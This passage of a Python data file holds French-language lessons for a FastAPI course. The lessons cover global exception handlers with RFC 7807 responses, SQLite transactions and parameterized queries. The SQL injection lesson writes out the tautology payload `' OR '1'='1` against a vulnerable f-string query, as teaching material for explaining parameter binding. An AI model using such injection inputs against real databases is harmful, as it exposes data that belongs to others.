                    "classe de base `starlette.exceptions.HTTPException` plutôt que la seule sous-classe "
                    "`fastapi.HTTPException` si vous voulez intercepter aussi les `404` d'URL inconnues et les `405` "
                    "automatiques du routeur ! — vous unifiez l'intégralité des erreurs `4xx` sous une enveloppe unique "
                    "**`application/problem+json` (RFC 7807)**."
                )
            },
            {
                "heading": "2. Le filet ultime `@app.exception_handler(Exception)` et le cloisonnement anti-fuite `500`",
                "body": (
                    "Le filet externe de Starlette, **`ServerErrorMiddleware`**, capture quant à lui les bogues "
                    "imprévus non anticipés par le développeur (`ZeroDivisionError`, `KeyError`, rupture de socket "
                    "PostgreSQL). En enregistrant `@app.exception_handler(Exception)`, vous prenez le contrôle absolu "
                    "de cette ultime frontière avant que le serveur n'émette un `500` générique en texte brut.\n\n"
                    "```python — Cloisonnement strict entre journalisation interne et réponse publique RFC 7807\n"
                    "@app.exception_handler(Exception)\n"
                    "async def capturer_erreur_500(request: Request, exc: Exception) -> JSONResponse:\n"
                    "    req_id = getattr(request.state, \"request_id\", \"req-inconnu\")\n"
                    "    logger.exception(\"Incident critique [%s] sur %s\", req_id, request.url.path)\n"
                    "    return JSONResponse(\n"
                    "        status_code=500,\n"
                    "        media_type=\"application/problem+json\",\n"
                    "        content={\n"
                    "            \"type\": \"https://api.isgp.dz/erreurs/erreur-interne\",\n"
                    "            \"title\": \"Erreur interne du serveur\",\n"
                    "            \"status\": 500,\n"
                    "            \"detail\": \"Une anomalie technique a été enregistrée par nos équipes.\",\n"
                    "            \"request_id\": req_id,\n"
                    "        },\n"
                    "    )\n"
                    "```\n\n"
                    "> [!WARNING] Subtilité de test : `TestClient(app, raise_server_exceptions=False)`\n"
                    "> Par défaut, `TestClient(app)` propage volontairement les exceptions Python `500` jusque dans votre script `pytest` afin de faciliter le débogage local. Pour vérifier dans un test automatisé que votre `@app.exception_handler(Exception)` renvoie bien un JSON RFC 7807 propre sans pile d'exécution, instanciez impérativement `TestClient(app, raise_server_exceptions=False)`."
                )
            },
            {
                "heading": "3. Diagnostic chirurgical en production par corrélation croisée (`request_id`)",
                "body": (
                    "Masquer les détails techniques au client protège votre infrastructure contre la reconnaissance "
                    "offensive, mais ne doit jamais aveugler vos propres ingénieurs d'exploitation. La clé de voûte "
                    "réside dans le couplage entre votre middleware d'audit (Chapitre 2.4) et vos gestionnaires "
                    "d'exceptions.\n\n"
                    "Lorsqu'une exception `500` survient à 03h14 du matin, `logger.exception(...)` consigne l'intégralité "
                    "de la pile d'appels Python (*Traceback*), les variables de contexte et le `request_id` dans votre "
                    "puits de logs sécurisé (fichiers tournants, Loki ou Elasticsearch), tandis que le client reçoit "
                    "uniquement la référence inoffensive `\"request_id\": \"req-8f2a9c01\"`. Dès qu'un partenaire "
                    "communique cette référence au support, la cause racine est localisée en quelques secondes sans "
                    "qu'aucun secret architectural n'ait jamais franchi Internet."
                )
            }
        ],
        "architecture_diagram": (
            "INTERCEPTION GLOBALE DES EXCEPTIONS AVEC @app.exception_handler DANS FASTAPI :\n\n"
            "  Client appelle GET /api/url-inconnue ou POST invalide\n"
            "     |\n"
            "     +---> StarletteHTTPException (404 / 405) ---> @app.exception_handler(StarletteHTTPException)\n"
            "     +---> RequestValidationError (422)       ---> @app.exception_handler(RequestValidationError)\n"
            "     +---> Exception Python imprévue (500)    ---> @app.exception_handler(Exception)\n"
            "                                                     |\n"
            "                                                     v\n"
            "                                          JSONResponse RFC 7807 (application/problem+json)"
        ),
        "reference_table": {
            "title": "Les 3 Gestionnaires `@app.exception_handler` Indispensables dans une API FastAPI",
            "headers": ["Décorateur FastAPI", "Déclencheur", "Information utile à inclure dans le JSON RFC 7807"],
            "rows": [
                ["`@app.exception_handler(StarletteHTTPException)`", "Erreurs `404`, `405`, `HTTPException`", "`status`, `title`, `detail`, `instance: request.url.path`"],
                ["`@app.exception_handler(RequestValidationError)`", "Échec de validation Pydantic (`422`)", "`status: 422`, `errors: exc.errors()`"],
                ["`@app.exception_handler(Exception)`", "Bug Python non intercepté (`500`)", "`status: 500`, `detail: \"Erreur interne (réf: X-Request-ID)\"` (sans Traceback !)"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Renvoyer `str(exc)` ou `traceback.format_exc()` dans la réponse JSON `500` en production",
                "good": "Journaliser la trace complète côté serveur et renvoyer uniquement un message générique avec `request_id` au client",
                "why": "Exposer les traces d'exécution Python en production révèle vos bibliothèques, vos requêtes SQL et l'arborescence du serveur."
            },
            {
                "bad": "Oublier `raise_server_exceptions=False` lors du test d'une route `500` avec `TestClient(app)`",
                "good": "Utiliser `TestClient(app, raise_server_exceptions=False)` pour vérifier la réponse HTTP `500` retournée au client",
                "why": "Par défaut, `TestClient(app)` relève l'exception Python directement dans le test pour faciliter le débogage."
            }
        ],
        "practical_exercises": [
            "Exécutez le script dans l'atelier ci-dessus et vérifiez que les quatre scénarios d'échec (`404`, `405`, `422` et `500`) produisent tous l'en-tête `content-type: application/problem+json`.",
            "Interrogez `GET /api/sandbox/formations/999` dans le Client HTTP intégré pour inspecter la réponse normalisée renvoyée sur une entité absente."
        ]
    },

    # =========================================================================
    # JOUR 3 — CHAPITRE 3.4 : PERSISTANCE SQLITE3, ACID & INJECTIONS SQL
    # =========================================================================
    "d3-l4": {
        "context": (
            "Maintenir un catalogue dans une liste Python `FORMATIONS = [...]` souffre de deux vices rédhibitoires en "
            "production : d'une part, la mémoire vive (RAM) est **volatile** — le moindre redémarrage de déploiement "
            "ou redimensionnement de conteneur anéantit toutes les écritures effectuées par les usagers ; d'autre part, "
            "lorsque quatre processus workers Uvicorn tournent en parallèle, chacun possède son propre espace mémoire "
            "isolé et ne voit jamais les ajouts réalisés chez ses voisins.\n\n"
            "La persistance durable et partagée exige un **Système de Gestion de Base de Données Relationnelle "
            "(SGBDR)** gouverné par des transactions **ACID**. La bibliothèque standard Python embarque nativement le "
            "moteur C transactionnel **SQLite (`sqlite3`)**, offrant un terrain rigoureux pour maîtriser le cycle de "
            "vie des connexions par `Depends(get_db)` avec `yield`, l'intégrité référentielle et l'éradication "
            "mathématique des **Injections SQL**."
        ),
        "deep_sections": [
            {
                "heading": "1. Garanties transactionnelles ACID, journalisation WAL et injection `Depends(get_db)` avec `yield`",
                "body": (
                    "Contrairement à un simple fichier JSON réécrit sur disque (qui finirait tronqué et illisible si "
                    "une coupure électrique survenait au milieu de `write()`), un moteur relationnel comme SQLite ou "
                    "PostgreSQL organise ses données en pages d'arbres équilibrés (**B-Trees**) protégées par un journal "
                    "de transactions garantissant les quatre invariants **ACID** (*Atomicité, Cohérence, Isolation, "
                    "Durabilité*).\n\n"
                    "L'**Atomicité** assure qu'une séquence d'écritures liées — débiter un budget formation puis "
                    "inscrire le stagiaire — réussit intégralement au moment précis de `conn.commit()`, ou est annulée "
                    "sans laisser la moindre trace partielle via `conn.rollback()`. En activant en outre le mode "
                    "`PRAGMA journal_mode=WAL;` (*Write-Ahead Logging*) et `conn.row_factory = sqlite3.Row`, SQLite "
                    "autorise les lectures concurrentes pendant une écriture et restitue des lignes directement "
                    "convertibles en dictionnaires JSON (`dict(row)`).\n\n"
                    "```python — Gestionnaire de connexion déterministe injecté par FastAPI (Depends + yield)\n"
                    "def get_db():\n"
                    "    conn = sqlite3.connect(DB_PATH, check_same_thread=False)\n"
                    "    conn.row_factory = sqlite3.Row\n"
                    "    try:\n"
                    "        yield conn\n"
                    "    finally:\n"
                    "        conn.close()  # Exécuté systématiquement après la réponse HTTP, même en cas d'exception !\n"
                    "```"
                )
            },
            {
                "heading": "2. Compilation de l'arbre syntaxique SQL (AST) : pourquoi les requêtes paramétrées `?` rendent la SQLi impossible",
                "body": (
                    "Classée depuis deux décennies au sommet des vulnérabilités critiques par l'**OWASP**, l'**Injection "
                    "SQL (*SQLi*)** naît d'une confusion fatale entre **le code exécutable** (la grammaire SQL) et **les "
                    "données passives** (la saisie de l'utilisateur).\n\n"
                    "Lorsqu'un développeur assemble une requête par concaténation ou *f-string* — "
                    "`conn.execute(f\"SELECT * FROM formations WHERE salle = '{salle}'\")` — il livre au compilateur "
                    "SQL une chaîne monolithique. Si un attaquant transmet `salle = \"' OR '1'='1\"`, l'apostrophe "
                    "referme prématurément le littéral texte et greffe un nouvel opérateur logique `OR '1'='1'` directement "
                    "dans l'**Arbre Syntaxique Abstrait (AST)** de la requête : le prédicat devenant tautologique, "
                    "la base restitue l'intégralité de ses tables confidentielles !\n\n"
                    "> [!IMPORTANT] Séparation physique du code et de la donnée par liaison de paramètres (`?`)\n"
                    "> Avec `conn.execute(\"SELECT * FROM formations WHERE salle = ?\", (salle,))`, le moteur C de SQLite **compile et fige l'AST de la requête SQL avant même de regarder la variable `salle`**. Lors de la phase d'exécution (*bind*), les octets de `salle` sont injectés directement dans le registre de valeur du nœud feuille `?` : il est structurellement impossible qu'une apostrophe ou un mot-clé `DROP TABLE` modifie l'arbre d'instructions déjà compilé."
                )
            },
            {
                "heading": "3. Invariants déclaratifs du schéma SQL (`UNIQUE`, `CHECK`) et traduction vers `409 Conflict`",
                "body": (
                    "La validation Pydantic à l'entrée de FastAPI vérifie la forme intrinsèque du payload, mais seule la "
                    "base de données détient la vérité concurrente permettant de garantir l'unicité d'un matricule ou "
                    "d'un code catalogue lorsque deux requêtes arrivent à la même milliseconde. Un schéma relationnel "
                    "robuste déclare donc ses garde-fous directement dans le DDL SQL : `NOT NULL`, `UNIQUE` sur les "
                    "identifiants métier naturels, `CHECK (duree_jours BETWEEN 1 AND 30)` et `FOREIGN KEY`.\n\n"
                    "Lorsqu'une insertion viole une contrainte `UNIQUE`, le pilote Python lève instantanément "
                    "`sqlite3.IntegrityError`. Plutôt que de laisser cette exception remonter vers un `500 Internal "
                    "Server Error`, l'ingénieur backend l'intercepte dans un bloc `try ... except sqlite3.IntegrityError:` "
                    "(accompagné d'un `conn.rollback()`) et émet une réponse HTTP **`409 Conflict`** au format RFC 7807, "
                    "informant proprement le client que la ressource entre en collision avec un enregistrement existant."
                )
            }
        ],
        "architecture_diagram": (
            "COMPARAISON : CONCATÉNATION VULNÉRABLE vs REQUÊTE PARAMÉTRÉE SÉCURISÉE (?)\n\n"
            "  Entrée malveillante du client : salle = \"' OR '1'='1\"\n"
            "        |\n"
            "        +---> [DANGER : f\"SELECT * FROM formations WHERE salle = '{salle}'\"]\n"
            "        |     Le parseur SQL voit : WHERE salle = '' OR '1'='1'  ---> FUITE TOTALE DE LA BASE !\n"
            "        |\n"
            "        +---> [SÉCURISÉ : execute(\"SELECT * FROM formations WHERE salle = ?\", (salle,))]\n"
            "              Le moteur SQL cherche littéralement une salle nommée \"' OR '1'='1\" ---> 0 résultat (Attaque neutralisée !)"
        ),
        "reference_table": {
            "title": "Correspondance Opérations CRUD ↔ Verbes HTTP ↔ Commandes SQL Paramétrées",
            "headers": ["Opération CRUD", "Route & Verbe HTTP", "Requête SQLite Paramétrée (`sqlite3`)", "Méthode de lecture résultat"],
            "rows": [
                ["**Create** (Créer)", "`POST /api/formations`", "`cur.execute(\"INSERT INTO formations (titre, salle) VALUES (?, ?)\", (t, s))` + `conn.commit()`", "`new_id = cur.lastrowid`"],
                ["**Read All** (Lister)", "`GET /api/formations`", "`conn.execute(\"SELECT * FROM formations LIMIT ? OFFSET ?\", (limit, offset))`", "`[dict(r) for r in cur.fetchall()]`"],
                ["**Read One** (Lire 1)", "`GET /api/formations/{id}`", "`conn.execute(\"SELECT * FROM formations WHERE id = ?\", (id,))`", "`row = cur.fetchone()` (`404` si `None`)"],
                ["**Update** (Modifier)", "`PUT /api/formations/{id}`", "`conn.execute(\"UPDATE formations SET titre = ?, salle = ? WHERE id = ?\", (t, s, id))` + `conn.commit()`", "`cur.rowcount`"],
                ["**Delete** (Supprimer)", "`DELETE /api/formations/{id}`", "`conn.execute(\"DELETE FROM formations WHERE id = ?\", (id,))` + `conn.commit()`", "`200 OK` ou `204 No Content`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Oublier la virgule dans un tuple à 1 seul élément : `conn.execute(\"... WHERE id = ?\", (formation_id))`",
                "good": "Toujours mettre la virgule : `conn.execute(\"... WHERE id = ?\", (formation_id,))`",
                "why": "En Python, `(5)` sans virgule est juste l'entier `5` entre parenthèses, alors que `(5,)` avec virgule est un tuple de 1 élément requis par `sqlite3`."
            },
            {
                "bad": "Oublier `conn.commit()` après un `INSERT`, `UPDATE` ou `DELETE`",
                "good": "Appeler systématiquement `conn.commit()` avant `conn.close()` lors d'une écriture",
                "why": "Sans `conn.commit()`, SQLite annule automatiquement toutes les modifications non validées à la fermeture de la connexion !"
            }
        ],
        "practical_exercises": [
            "Exécutez la démonstration comparative dans l'atelier ci-dessus pour constater l'exfiltration provoquée par une f-string SQL face à l'étanchéité totale du marqueur paramétré `?`.",
            "Enchaînez un cycle complet `POST` -> `PUT` -> `GET` -> `DELETE` sur `/api/sandbox/formations` depuis le **Client HTTP & Inspecteur** pour éprouver la persistance transactionnelle."
        ]
    }
}
